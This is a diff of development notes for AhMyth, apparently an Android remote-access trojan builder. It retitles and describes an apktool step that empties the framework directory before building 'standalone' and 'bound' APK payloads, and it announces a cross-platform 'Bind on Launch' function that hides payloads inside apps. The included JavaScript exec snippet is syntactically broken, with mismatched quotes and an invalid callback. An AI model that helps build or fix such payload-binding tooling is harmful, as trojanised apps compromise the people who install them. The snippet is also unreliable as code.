@@ -1,4 +1,5 @@
-# Framework empty for Windows
+# Empty the Framework Dir
+This Code will reduce building failed errors with both Standalone APK payloads and Bound APK Payloads, it empties the apktool framework directory before building any payload everytime
 ```js
 exec('java -jar ' + CONSTANTS.ApktoolJar + '" empty-framework-dir "'), (error, stderr, stdout) {
     if (error) {
@@ -7,9 +8,11 @@ exec('java -jar ' + CONSTANTS.ApktoolJar + '" empty-framework-dir "'), (error, s
 }
 ```
 
-# New Complete Bind On Launch function for Windows, Linux & macOS!
+# New Cross platform Bind on Launch function
 
 This one was a bit of a pain to manage, but it was done in the end, this future update will be used in the next release until something using `fs` can be constructed, in order to use less coding.
+
+This new function also fixes a bug that was recently discovered when running AhMyth on Windows machines.
 
 ```js  
     $appCtrl.BindOnLauncher = (apkFolder) => {
